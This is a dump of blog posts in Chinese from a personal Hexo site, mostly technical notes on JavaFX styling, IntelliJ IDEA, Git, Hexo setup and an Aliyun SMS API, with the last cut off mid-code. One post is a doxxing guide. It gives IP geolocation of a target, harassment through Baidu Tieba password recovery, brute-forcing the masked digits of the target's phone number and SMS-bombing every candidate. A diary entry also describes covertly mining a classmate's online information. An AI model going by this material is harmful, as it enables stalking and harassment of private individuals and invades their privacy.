控件.setId(&quot;特定样式名&quot;);</code></pre><h4 id="常用样式设置"><a href="#常用样式设置" class="headerlink" title="常用样式设置"></a>常用样式设置</h4><p>-fx-background-color: #00000;</p><p>设置背景颜色</p><p>设置边界(边缘线颜色)</p><p>-fx-border-radius: 4;</p><p>设置边界圆滑度</p><p>-fx-text-fill: #fff;</p><p>设置字体颜色</p><p>-fx-font-size 16;</p><p>设置字体大小</p><h4 id="关于默认样式的修改"><a href="#关于默认样式的修改" class="headerlink" title="关于默认样式的修改"></a>关于默认样式的修改</h4><p>在Fx当中每个控件其实都有一个默认的样式<br>当你不想使用默认控件的样式的时候你可在css中重新定义，此时原有的默认样式将会被覆盖掉。</p><p>可以使用:</p><pre><code>System.out.println(a.getClassStyle().toString());</code></pre><p>来查看默认样式。</p><h3 id="exe文件打包"><a href="#exe文件打包" class="headerlink" title="exe文件打包"></a>exe文件打包</h3><p>未完……</p>]]></content>
      
      
      <categories>
          
          <category> FX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FX </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA项目转换</title>
      <link href="/2020/02/21/idea/problem2/"/>
      <url>/2020/02/21/idea/problem2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq920447939/article/details/80981525?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">csdn</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA JAR包自动下载</title>
      <link href="/2020/02/20/idea/problem/"/>
      <url>/2020/02/20/idea/problem/</url>
      
        <content type="html"><![CDATA[<h3 id="IDEA-jar包自动搜索下载"><a href="#IDEA-jar包自动搜索下载" class="headerlink" title="IDEA jar包自动搜索下载"></a>IDEA jar包自动搜索下载</h3><p>我们的项目未必采用Maven构建，那么需要下载jar包时该怎么办？</p><pre><code>流程右键项目名称，点击Open Module Settings，转到Dependencies点击右侧绿色的加号，并选择 Library在弹出页面选择下面的New Library中的Frome Maven</code></pre><p><img src="http://img.ahdy.top/2020-02-25_235249.png" alt></p><pre><code>在弹出页面输入jar包名字，点击搜索，然后选择对应的版本。之后，注意选择该Library的级别为Project即可选完一定要点Add Selected最后，查看dependencies，我们发现jar已经被添加到项目</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>视频加速</title>
      <link href="/2020/02/19/framework/vidofast/"/>
      <url>/2020/02/19/framework/vidofast/</url>
      
        <content type="html"><![CDATA[<h3 id="HTML5加速"><a href="#HTML5加速" class="headerlink" title="HTML5加速"></a>HTML5加速</h3><p>本身自带加速功能  </p><pre><code>document.querySelector(‘video’) 筛选出播放视频的组件，然后直接设置播放速率就搞定了。视频用的是 html5 的原生 video 组件播放视频，不是 flash，我们就可以进行操作。</code></pre><p>在开发者模式控制台下运行</p><pre><code>document.querySelector(&#39;video&#39;).playbackRate = 5;</code></pre><p>示例:</p><pre><code>/* play video twice as fast */document.querySelector(&#39;video&#39;).defaultPlaybackRate = 2.0;//默认两倍速播放document.querySelector(&#39;video&#39;).play();/* now play three times as fast just for the heck of it */document.querySelector(&#39;video&#39;).playbackRate = 3.0;  //修改此值设置当前的播放倍数</code></pre><h3 id="Flash加速"><a href="#Flash加速" class="headerlink" title="Flash加速"></a>Flash加速</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>对于普通格式的视频，可以用 video 标签的 playbackrate 属性实现 2X 两倍速度播放，<br>flash 用的是 object 标签，如何设置播放速度呢？</p><p>这个比较头疼，因为它本身不自带加速功能。<br>如果想用js控制Flash可以参考<a href="https://blog.csdn.net/lzkkevin/article/details/6789593" target="_blank" rel="noopener">csdn文档</a></p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>使用一款软件，Enounce MySpeed 适用于32位浏览器</p><p><a href="https://share.weiyun.com/5OvCCfl" target="_blank" rel="noopener">腾讯微云</a></p><p>先打开 Enounce MySpeed，再打开浏览器播放视频</p><p>如何显示没有视频播放，可以刷新页面或者换一个浏览器试试，因为Flsh跟浏览器存在一定兼容问题导致</p><p>Enounce MySpeed亲测在IE上有效果！</p>]]></content>
      
      
      <categories>
          
          <category> vido </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flash </tag>
            
            <tag> HTML5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网上书城(电商)管理系统</title>
      <link href="/2020/01/14/java/javaprogect/"/>
      <url>/2020/01/14/java/javaprogect/</url>
      
        <content type="html"><![CDATA[<h3 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h3><p>Spring+Spring Mvc  (包含mybatis但没有使用)<br>前端使用bootstarp，后端使用layui<br>表单使用到Ajax 异步，form<br>项目使用maven构建。  </p><h3 id="主页面展示"><a href="#主页面展示" class="headerlink" title="主页面展示"></a>主页面展示</h3><p><img src="http://img.ahdy.top/视频_2020-01-14_005555.gif" alt></p><h3 id="登录-注册功能"><a href="#登录-注册功能" class="headerlink" title="登录/注册功能"></a>登录/注册功能</h3><p><img src="http://img.ahdy.top/视频_2020-01-14_010904.gif" alt></p><h3 id="书籍-购物车"><a href="#书籍-购物车" class="headerlink" title="书籍/购物车"></a>书籍/购物车</h3><p><img src="http://img.ahdy.top/_2020-01-14_011655.gif" alt></p><h3 id="结算-支付宝"><a href="#结算-支付宝" class="headerlink" title="结算/支付宝"></a>结算/支付宝</h3><p><img src="http://img.ahdy.top/视频_2020-01-14_012306.gif" alt></p><h3 id="后台login-注册界面"><a href="#后台login-注册界面" class="headerlink" title="后台login/注册界面"></a>后台login/注册界面</h3><p><img src="http://img.ahdy.top/视频_2020-01-14_012757.gif" alt></p><h3 id="后台功能"><a href="#后台功能" class="headerlink" title="后台功能"></a>后台功能</h3><p><img src="http://img.ahdy.top/视频_2020-01-14_013228.gif" alt="四张表的增删改，包括Ajax图片上传,分页显示"></p><h3 id="其余附加功能"><a href="#其余附加功能" class="headerlink" title="其余附加功能"></a>其余附加功能</h3><p>1.IP地址定位<br>2.机器人客服<br>3.短信验证码接受<br><img src="http://img.ahdy.top/_2020-01-14_013902.gif" alt="简要演示"></p><p><img src="http://img.ahdy.top/2020-01-14%20014200.png" alt="结构图"></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>由于项目代码很多，贴代码又没啥意思，so去下载完整项目学习吧。<br><a href="https://github.com/zzl521/system" target="_blank" rel="noopener">GitHub地址</a>含sql脚本  </p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hexo框架搭建博客</title>
      <link href="/2020/01/13/boke/hexobk/"/>
      <url>/2020/01/13/boke/hexobk/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://baijiahao.baidu.com/s?id=1611049563250507911&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">来源百度</a></p><h3 id="hexo框架使用"><a href="#hexo框架使用" class="headerlink" title="hexo框架使用"></a>hexo框架使用</h3><h4 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h4><p>该框架依赖git执行脚本，node.js为运行库，所以需要将二者下载下来，缺一不可！<br><img src="http://img.ahdy.top/2020-01-12_004952.png" alt="参考下面官方文档去下载必要的组件"><br><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">官方文档</a>  </p><p>安装好之后检查node.js环境<br><img src="http://img.ahdy.top/2020-01-12_005251.png" alt>  </p><p>安装好之后检查Git环境</p><pre><code>右键文件或者桌面夹出现Git brash / Git Gui即可</code></pre><h4 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h4><p>安装hexo框架。  </p><p>1.自定义一个文件夹/如果不会cmd命令也可以直接git brash here  </p><pre><code>输入npm install hexo -g开始安装Hexo</code></pre><p>2.检查hexo是否安装成功</p><pre><code>输入hexo -v  </code></pre><p>3.初始化该文件夹</p><pre><code>输入hexo init（有点漫长的等待。。。）</code></pre><p>4.出现Start blogging with Hexo！初始化成功！</p><p>5.安装所需要的组件</p><pre><code>输入npm install</code></pre><p>6.创建静态文件</p><pre><code>输入hexo g，首次体验Hexo</code></pre><p>7.开启服务器，访问该网址</p><pre><code>hexo s</code></pre><p><img src="http://img.ahdy.top/1108615-20171021232413224-1288183746.png" alt="如图所示安装成功"></p><h3 id="将Hexo与Github-page联系起来"><a href="#将Hexo与Github-page联系起来" class="headerlink" title="将Hexo与Github page联系起来"></a>将Hexo与Github page联系起来</h3><p><a href="https://github.com" target="_blank" rel="noopener">Github官网</a></p><p>如果是第一次，选中你的配置好的hexo框架文件夹，标右键，点击Git Base Here，设置用户名和邮箱地址。  </p><pre><code>$ git config --global user.name &quot;runoob&quot;$ git config --global user.email &quot;test@runoob.com&quot;</code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>请修改双引号当中的内容，其中name为你github用户名，邮箱为注册github账户时的邮箱，避免出现差错！</p><h3 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h3><pre><code>Github账户注册和新建项目，项目必须要遵守格式：账户名.github.io，不然接下来会有很多麻烦。并且需要勾选Initialize this repository with a README</code></pre><p><img src="http://img.ahdy.top/1108615-20171021223639881-1998790649.png" alt><br>(请务必按照此格式来命名仓库！)<br>之后参考博客<a href="https://blog.csdn.net/u013778905/article/details/83501204" target="_blank" rel="noopener">Github SSH key配置</a>  确保SSH key配置完成</p><h3 id="仓库地址配置"><a href="#仓库地址配置" class="headerlink" title="仓库地址配置"></a>仓库地址配置</h3><p>当配置好了ssh key基本上已经算结束了，你只需要打开这个博客项目，修改hexo框架内的_config.yml<br><img src="http://img.ahdy.top/2020-01-13_185114.png" alt><br>其中repo为你自己的仓库地址</p><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>同样在_config.yml进行设置<br><img src="http://img.ahdy.top/2020-01-13_191037.png" alt><br>前提是需要将你下载好的主题放在themes文件夹下<br><img src="http://img.ahdy.top/2020-01-13_191237.png" alt>   </p><p>主题可以在<a href="https://hexo.io/themes/" target="_blank" rel="noopener">官方文档</a>下载</p><h3 id="上传命令"><a href="#上传命令" class="headerlink" title="上传命令"></a>上传命令</h3><pre><code>生成以及部署文章之前，需要安装一个扩展：npm install hexo-deployer-git --save只需安装一次，以后不用再安装  </code></pre><h4 id="更新博客步骤"><a href="#更新博客步骤" class="headerlink" title="更新博客步骤"></a>更新博客步骤</h4><pre><code>hexo cleanhexo ghexo d后两步可简写成 hexo g -d</code></pre><h4 id="上传仓库成功截图"><a href="#上传仓库成功截图" class="headerlink" title="上传仓库成功截图"></a>上传仓库成功截图</h4><p><img src="http://img.ahdy.top/2020-01-13_191833.png" alt="类似信息说明上传成功"></p><pre><code>成功后访问你的地址：http://用户名.github.io，那么将可以通过浏览器访问到你部署的web界面。</code></pre><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>部署博客有些细节非常重要，切记不能省略配置文件前的空格：<br>建议选择有主题配置及介绍的博客下载。</p><h3 id="如何编写文档"><a href="#如何编写文档" class="headerlink" title="如何编写文档"></a>如何编写文档</h3><p>一般文档都是放在</p><pre><code>Blog\source\_posts\文件夹内</code></pre><p>你可以直接将md文件放入，框架就会自动解析成静态的web界面</p><h5 id="md文档可以使用markdown来编写"><a href="#md文档可以使用markdown来编写" class="headerlink" title="md文档可以使用markdown来编写"></a>md文档可以使用markdown来编写</h5><p>可以花几分钟学一下markdown的语法，什么菜鸟，自学，csdn应该都会有教程。<br><a href="http://z.ahdy.top/2019/07/23/markdown/" target="_blank" rel="noopener">如果不嫌弃可以看一下我总结，但是只仅限于写文档用</a></p><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p>关于图床我用的是七牛云的对象云储，其实也是因为它免费。<br>你可以这样理解，图床就是一个存放图片外链的容器，当然也可以存放视频，音频的外链；</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>简单概括了搭建博客的方式，我估计只有我自己能看懂吧，哈哈，毕竟这些东西当时我搞了两天。出了很多bug！就很egg 疼。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub仓库文件上传</title>
      <link href="/2020/01/12/boke/githud/"/>
      <url>/2020/01/12/boke/githud/</url>
      
        <content type="html"><![CDATA[<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p> 一：Git是什么？</p><pre><code>Git是目前世界上最先进的分布式版本控制系统。</code></pre><p>二：SVN与Git的最主要的区别？</p><p>SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而干活的时候，用的都是自己的电脑，所以首先要从中央服务器哪里得到最新的版本，然后干活，干完后，需要把自己做完的活推送到中央服务器。</p><p>集中式版本控制系统是必须联网才能工作，如果在局域网还可以，带宽够大，速度够快，如果在互联网下，如果网速慢的话，就纳闷了。  </p><p>Git是分布式版本控制系统，那么它就没有中央服务器的，每个人的电脑就是一个完整的版本库，这样，工作的时候就不需要联网了，因为版本都是在自己的电脑上。</p><p>既然每个人的电脑都有一个完整的版本库，那多个人如何协作呢？比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。</p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p>1.下载GitHub管理工具  </p><p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">Git下载</a></p><p>2.安装成功后设置用户名和邮箱地址</p><pre><code>$ git config --global user.name &quot;runoob&quot;$ git config --global user.email test@runoob.com如果你使用了github仓库那么请设置成你的github用户名和注册github账号的邮箱。</code></pre><p>注意：git config  –global 参数，有了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然你也可以对某个仓库指定的不同的用户名和邮箱。</p><p>3.创建仓库  </p><p>你可以自定义一个文件夹，右键-&gt;get Bash here进入cmd窗口。  </p><p>使用pwd可以查看当前文件夹路径。</p><pre><code>使用 git init 使文件夹变为仓库。  </code></pre><p><img src="http://img.ahdy.top/2020-01-11_232733.png" alt><br>之后你会发现文件夹内多了一个.git文件夹，不要手动乱改这个目录里面的文件，否则，会把git仓库给破坏了。<br><img src="http://img.ahdy.top/2020-01-11_233023.png" alt></p><p>4.关联到远程库</p><pre><code>git remote add origin 你的远程库地址</code></pre><p>如：</p><pre><code>git remote add origin https://github.com/githubusername/demo.git</code></pre><p>5.用命令 git commit告诉Git，把文件提交到仓库。引号内为提交说明</p><pre><code>git commit -m &#39;first commit&#39;</code></pre><p>6、获取远程库与本地同步合并（如果远程库不为空必须做这一步，否则后面的提交会失败）</p><pre><code>git pull --rebase origin master</code></pre><p>6、把本地库的内容推送到远程，使用 git push命令，实际上是把当前分支master推送到远程。执行此命令后会要求输入用户名、密码，验证通过后即开始上传。</p><pre><code>git push -u origin master*、状态查询命令git status</code></pre><p><img src="http://img.ahdy.top/2020-01-11_233805.png" alt><br><img src="http://img.ahdy.top/2020-01-11_233839.png" alt="正在上传文件"><br>如果github仓库没有内容可能是数据没过来，国外网站你懂的，就是比较慢！<br>GitHub仓库可以解析静态HTML页面，后面的博客也是利用到了这一点，GitHub仓库充当了一个静态服务器加数据库的角色。</p><h3 id="上传成功效果图"><a href="#上传成功效果图" class="headerlink" title="上传成功效果图"></a>上传成功效果图</h3><p><img src="http://img.ahdy.top/2020-01-12_001310.png" alt="仓库内会有内容"></p><h3 id="下载仓库内容"><a href="#下载仓库内容" class="headerlink" title="下载仓库内容"></a>下载仓库内容</h3><p>使用命令</p><pre><code>git clone 加上仓库地址</code></pre><p>例如 </p><pre><code>git clone https://github.com/zzl521/system.git</code></pre><p>前提你要找个空文件夹brash，不然会搞得乱七八糟。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><img src="http://img.ahdy.top/1074438610.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爱而不得</title>
      <link href="/2020/01/07/draiy/love/"/>
      <url>/2020/01/07/draiy/love/</url>
      
        <content type="html"><![CDATA[<h3 id="故事的开始"><a href="#故事的开始" class="headerlink" title="故事的开始"></a>故事的开始</h3><p>第一次见到她并没有喜欢的感觉，只是觉得这女孩很简单。<br>喜欢可能是从写她名字开始吧！不要问我为什么会无缘无故写人家名字，当然我是被动的，其次就是因为她比较…怎么讲..形单影只，然后讲话又比较喋，就激起了我一种保护欲。反正喜欢这种事情，应该不需要什么理由吧，我第一次喜欢女孩子，中间很长一段时间我都在骗自己，我不是喜欢她，事实证明我会忍不住会想她..还会梦见她…对我影响挺大的….很烦…</p><p>她会找我帮忙，起码她不讨厌我对吧！而且专业里大部分都是男孩子，她会找我，怎么说呢，说明我在她心里有那么点点吧~啊！我好卑微……</p><h3 id="有目的的接近"><a href="#有目的的接近" class="headerlink" title="有目的的接近"></a>有目的的接近</h3><p>我见到她都不敢说话，加上我本身就腼腆,只好从群里-私聊她-发消息，问她冷不冷，要不要来电子阅览室，发出去之后，脸都是发烫的，其实我就想多看她两眼嘛，不过她倒是回了，她说她不冷…但是她主动加了我QQ好友…给我后面无事献殷勤提供了机会。(这么说好像有点不恰当)  </p><p>本来很久没见她，那种感觉也就渐渐淡了。  </p><p>学校要求晨跑，算体育成绩，于是早上就见到了她，她一个人在跑，她没跑几步就会停下来，我就在她后面远远的看着她，哈哈，我好怂，我为什么不追上去跟她打招呼再帮她跑呢！毕竟我感觉跟人家关系也不怎么近亲，太主动有些过，也不符合我性格，这一见坏了，又激起了我对她的保护欲，我在想怎么帮她跑呢，然后我跟她聊天一步步把她引向我的圈套，她要给我钱……我当时就懵了，看不出来我心思嘛，谈钱多伤感情，收钱那不全完了…….于是我直说了要帮她，于是那几天早上我跟做贼似的，悄悄起来，不惊动室友，因为每天能见到她就会开心一整天。</p><p>我对她的事情有求必应，而且格外上心，我喜欢她胜过我自己。  </p><h3 id="我希望她变优秀"><a href="#我希望她变优秀" class="headerlink" title="我希望她变优秀"></a>我希望她变优秀</h3><p>我有经常写文档的习惯，我有向她分享过好玩的东西，大部分都是我自己写的，我有说过让她多考证，多…可是莹…她应该不懂我心思……她经常把天聊死,还说我打字慢，打字慢那是因为我喜欢她嘛，我小心翼翼怕说错什么话！</p><h3 id="她是猪"><a href="#她是猪" class="headerlink" title="她是猪"></a>她是猪</h3><p>她不注意细节，毁了我好多温柔。<br>有一天她说想考证，我当然高兴啊，然后事情发展的就有点快…因为当时本地报满了，只能去外地考，然后她让我和她一起？？？还要请我吃淮南牛肉汤？？？ 我当时好开心，于是我研究路线，想着买我俩的车票….结果呢…当初有多开心，后来就有多伤心，我报了，她这只猪没报上….还说什么她自己去淮南….不要我买票什么的，这都是天意，后来考试也因为疫情取消了……  </p><p>我心思缜密，因此她天真的以为我真的是为了考试…其实我这次不考又能怎样，我这么大人哪不能去，要她一女孩带着才能去吗？我更多的是想接近她罢了！</p><p>期间我傻傻的买了个戒指，打算跟她去淮南的时候送她.<br><img src="http://img.ahdy.top/IMG_20200418_124805.jpg" alt><br>金的，虽然就几克…后来这东西在我桌子上被妈妈看见了，我只好说是送给她三八节的礼物，她开心了好久！  </p><p>我不轻易承诺，因为我说过的话，就一定会做到。</p><p>我不怎么会聊天，不会撩女孩子，准确说是不会骗吧，花言巧语我做不出来…我这种应该不会被女孩子喜欢吧。  </p><p>两个班上大课，我就喜欢坐在她后面，因为这样能一直看着她，她有时候会偷懒，有时候会扣手指，有时候会偷玩两下手机……她也问过我是不是坐在她后面，她就没想过那么多位置，我为什么偏偏坐在她后面……</p><p>她喜欢奶茶，我就想买给她，可她说她不想出来…怎么办，所以我去找刘同学聊天搞好关系，她室友，希望让刘同学带给她…..因为之前我在女生宿舍楼下等她20分钟…我手里领着好吃的，好多女生看我，我受不了那种看，当时我心里有个奇怪的想法，看不见我，看不见我，奥义~隐身术！</p><p>她喜欢打游戏，我两年都没玩那游戏，下回来为了什么嘛，还不是因为她喜欢，可是她拒绝我..两次，不是说不想玩，就是，卸载了……其实是想卖她人情啊！我可能让她输嘛！我也打不过她啊！我就想输了，夸夸她厉害，然后输了以答应条件为赌注，给她买东西对她好…<br>可是我连跟她玩的机会都没有！</p><p>呜呜呜~气死我了！！！我当然会生气啊！只是一般人看不出来我会生气罢了。  </p><h3 id="释怀"><a href="#释怀" class="headerlink" title="释怀"></a>释怀</h3><p>我不敢过于频繁的找她，怕她会烦，每次找她，其实都是控制不住了，我喜欢她，但是我感觉她并不喜欢我！或许我对她来说就是多余的，或许她有比我更好的男孩子喜欢。  </p><p>只要远远的看着她，我就很满足了，或许时间会冲刷这些。感情这种事，有时候没有结果，要比有结果可以接受的多。</p><h3 id="喜欢一个人是什么感觉"><a href="#喜欢一个人是什么感觉" class="headerlink" title="喜欢一个人是什么感觉"></a>喜欢一个人是什么感觉</h3><p>我就讲讲自己吧，见到她会显得有些惊慌，有些不知所措，两手无处安放，心跳加快，会脸红，显得很不自然，眼睛会躲避她的目光，显得我毫不在意她，但有时又会偷看她，注视她的一举一动。遇到漂亮女生我最多多看两眼，但是这种感觉很特别，可能这就是喜欢，就是心动感觉吧。我比较特别，我很少因为一个女生的外表就去喜欢她，我喜欢的女孩一定是因为她比较特别，比较优秀。</p><h3 id="我喜欢一个人"><a href="#我喜欢一个人" class="headerlink" title="我喜欢一个人"></a>我喜欢一个人</h3><p>今年我20岁，从来没有过的迷茫，焦虑伴随着我，我喜欢上一个人，我深知可能得不到她，但我却情愿一错再错，她网上和我聊的很多，现实她可能比较羞涩，当她叫我大哥的那一刻起，我就应该明白她只想和我做朋友，但是我又怎能甘心做朋友，正应验了那句，在最无能为力的时候，遇见最想要照顾一生的人，强大的自尊心和自卑心在作祟，我要是能许下她一个未来该多好！<br>我明白现在办不到，可是等我办到的时候，她还在吗？那应该是等不到了，我不是一个值得托付的人，我只能知耻而后勇,知弱而图强。<br>这次回家，父亲给我谈了很多，他对我期望值很高，也更加确定了一点，我不得不放手！  </p><h3 id="喜欢一个人是自私的"><a href="#喜欢一个人是自私的" class="headerlink" title="喜欢一个人是自私的"></a>喜欢一个人是自私的</h3><p>真正喜欢一个人的时候，你会发现你对她的一切都变得敏感，默默关注着她，我是一个很多事都能放下的人，但是唯独喜欢这件事，我是自私的，我想得到她的一切，我利用所学的东西挖掘了她在网上的信息，想多了解她一点，想着能聊进她的爱好，能有谈论的话题。<br>以为蒙上了眼睛，就可以看不见这个世界；以为捂住了耳朵，就可以听不到所有的烦恼；以为脚步停了下来，心就可以不再远行；以为我需要的感情，只是我一厢情愿。<br>喜欢一个人是藏不住，尽管是单相思，相信大多数人心甘情愿。<br>多少次又多少次，回忆把生活划成一个圈，而我在原地转了无数次，无法解脱。  </p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>人生最难过的事，莫过于你遇上一个特别爱的人，却又明白，可能永远不会在一起，但心中那份爱恋，终将难以忘却。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
            <tag> Message </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人网上信息挖掘</title>
      <link href="/2020/01/07/attark/search/"/>
      <url>/2020/01/07/attark/search/</url>
      
        <content type="html"><![CDATA[<h3 id="获取一个人的地理位置"><a href="#获取一个人的地理位置" class="headerlink" title="获取一个人的地理位置"></a>获取一个人的地理位置</h3><p>可以参考<a href="http://z.ahdy.top/2019/10/11/attark/findip/" target="_blank" rel="noopener">ip定位</a><br>内容补充<a href="https://www.opengps.cn/" target="_blank" rel="noopener">高精度IP定位</a><br>进站后选择定位技术-&gt;高精度定位。  </p><p><a href="http://lbsyun.baidu.com/" target="_blank" rel="noopener">百度地图开放平台</a></p><p><a href="https://lbs.amap.com" target="_blank" rel="noopener">高德地图开放平台</a>  </p><p><a href="http://www.net.cn/static/customercare/yourip.asp" target="_blank" rel="noopener">本地公网IP地址获取</a>  </p><p><a href="http://www.ip138.com/" target="_blank" rel="noopener">多功能查询地址</a></p><h3 id="人肉思路"><a href="#人肉思路" class="headerlink" title="人肉思路"></a>人肉思路</h3><p>首先可以百度QQ号，看看能不能利用搜索引擎搜索到他在网上的痕迹，一般的如果对方玩过贴吧，将会进一步为信息采集提供便利，如果能找到对方百度贴吧的ID那么就能通过找回密码的方式对对方进行骚扰，当然以前QQ也是这种，后来QQ改了，让自己给服务器发送编码，发送完成后选择我已经发送才可以修改密码，利用百度贴吧ID找回密码的信息，可以通过暴力的方式去获取对方手机号码，比如在找回密码的时候你会看到有这样一条信息请输入186<strong>**</strong>08收到验证码后输入验证码完成修改密码，这时候如果你知道对方的家在哪（IP定位），就能够根据区域号知道他中间四位数字，然后使用枚举，暴力出缺失的两位，其中必定有一个是目标的手机号，俗话所错杀一千不能放过一个你可以对暴力出的所有号码进行短信轰炸。<br>其实真正挖掘信息是非常困难的一件事情，这种方式只局限于QQ好友，微信好友等。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Message </tag>
            
            <tag> 人肉 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>短信服务API</title>
      <link href="/2020/01/01/framework/alimessageinterface/"/>
      <url>/2020/01/01/framework/alimessageinterface/</url>
      
        <content type="html"><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>随着互联网的发展，信息安全显得尤为重要，在保证互联网环境稳定运行的情况下，为了不让一些人在网上搞破坏，采取实名认证的方式去约束其行为，不要觉得网络就是法外之地，短信验证码注册的作用，一定程度上保证信息真实性，也规范了用户的使用行为。</p><h3 id="阿里云短信服务接口使用方式"><a href="#阿里云短信服务接口使用方式" class="headerlink" title="阿里云短信服务接口使用方式"></a>阿里云短信服务接口使用方式</h3><p>这篇文档将用最快速的方式去让读者学会接口使用<br>1.注册阿里云账号  </p><p>2.实名认证</p><p>3.使用短信服务API接口，注册短信模板，注册签名，注册AccessKey，三者缺一不可。<br><a href="https://help.aliyun.com/product/44282.html?spm=5176.12207334.0.0.50c41cbei0gcBM" target="_blank" rel="noopener">官方文档</a><br>4.将下面给出代码中的模板，签名，key值替换掉你的即可实现短信验证码接收（一条短信大概四分五）</p><h4 id="maven包导入"><a href="#maven包导入" class="headerlink" title="maven包导入"></a>maven包导入</h4><p>添加到pom.xml中</p><pre><code>    &lt;dependency&gt;      &lt;groupId&gt;com.aliyun&lt;/groupId&gt;      &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt;      &lt;version&gt;4.0.8&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;com.aliyun&lt;/groupId&gt;      &lt;artifactId&gt;aliyun-java-sdk-dysmsapi&lt;/artifactId&gt;      &lt;version&gt;1.1.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/com.google.code.gson/gson --&gt;    &lt;dependency&gt;      &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;      &lt;artifactId&gt;gson&lt;/artifactId&gt;      &lt;version&gt;2.8.4&lt;/version&gt;    &lt;/dependency&gt;</code></pre><h4 id="类1，接口配置信息"><a href="#类1，接口配置信息" class="headerlink" title="类1，接口配置信息"></a>类1，接口配置信息</h4><pre><code>package com.Message;//package com.Message;public class StaticPeram {    final static String defaultConnectTimeout  = &quot;sun.net.client.defaultConnectTimeout&quot;;    final static String defaultReadTimeout = &quot;sun.net.client.defaultReadTimeout&quot;;    final static String Timeout = &quot;10000&quot;;    // 初始化ascClient需要的几个参数    final static String product = &quot;Dysmsapi&quot;;// 短信API产品名称（短信产品名固定，无需修改）    final static String domain = &quot;dysmsapi.aliyuncs.com&quot;;// 短信API产品域名（接口地址固定，无需修改）    // 替换成你的AK (产品密)    final static String accessKeyId = &quot;&quot;;// 你的accessKeyId,填你自己的 上文配置所得  自行配置    final static String accessKeySecret = &quot;&quot;;// 你的accessKeySecret,填你自己的 上文配置所得 自行配置    // 必填:短信签名-可在短信控制台中找到    final static String SignName = &quot;ahdy6&quot;; // 阿里云配置你自己的短信签名填入    // 必填:短信模板-可在短信控制台中找到    final static String TemplateCode = &quot;&quot;; // 阿里云配置你自己的短信模板填入}</code></pre><h4 id="类2，API-jar包方法执行"><a href="#类2，API-jar包方法执行" class="headerlink" title="类2，API,jar包方法执行"></a>类2，API,jar包方法执行</h4><pre><code>package com.Message;//package com.Message;import com.aliyuncs.DefaultAcsClient;import com.aliyuncs.IAcsClient;import com.aliyuncs.dysmsapi.model.v20170525.SendSmsRequest;import com.aliyuncs.dysmsapi.model.v20170525.SendSmsResponse;import com.aliyuncs.exceptions.ClientException;import com.aliyuncs.exceptions.ServerException;import com.aliyuncs.http.MethodType;import com.aliyuncs.profile.DefaultProfile;import 